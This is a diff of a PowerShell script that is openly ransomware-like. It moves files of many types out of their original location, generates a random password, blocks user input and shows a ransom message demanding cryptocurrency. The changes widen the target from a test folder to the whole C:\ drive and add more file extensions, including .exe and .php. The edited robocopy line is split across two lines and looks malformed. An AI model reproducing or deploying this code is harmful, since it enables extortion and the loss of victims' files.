@@ -42,12 +42,12 @@ Start-Sleep -s 10
 rm -Force $workdir\7*
 
 #Set source and destination of files to copy and store (ideally you would use something other than desktop)
-$Source = "C:\Users\(username)\Desktop\StealableFiles"
-$Destination = "C:\Users\(username)\Desktop\StolenFiles"
+$Source = "C:\"
+$Destination = "C:\files"
 
 #Copy all files with certain extension and delete them in the source location
-$cp = robocopy /mov $Source $Destination *.txt /s
-
+$cp = robocopy /mov $Source $Destination *.txt /s *.png /s 
+*.mp4 /s *.pdf /s *.csv /s *.php /s *.exe /s *.ddl /s
 #Generate a random 8 character password
 [Reflection.Assembly]::LoadWithPartialName("System.Web")
 $randomPassword = [System.Web.Security.Membership]::GeneratePassword(8,2)
@@ -106,4 +106,4 @@ $userInput::BlockInput($false)
 Add-Type -AssemblyName System.Windows.Forms
 
 #Show the message
-$result = [System.Windows.Forms.MessageBox]::Show('We have some of your important files!!! We demand 2500 DogeCoins for their return.', '!-Notice-!', 'Ok', 'Warning')
+$result = [System.Windows.Forms.MessageBox]::Show('We have some of your important files!!! We demand 50,000 SelaCoins for their return.', '!-Notice-!', 'Ok', 'Warning')
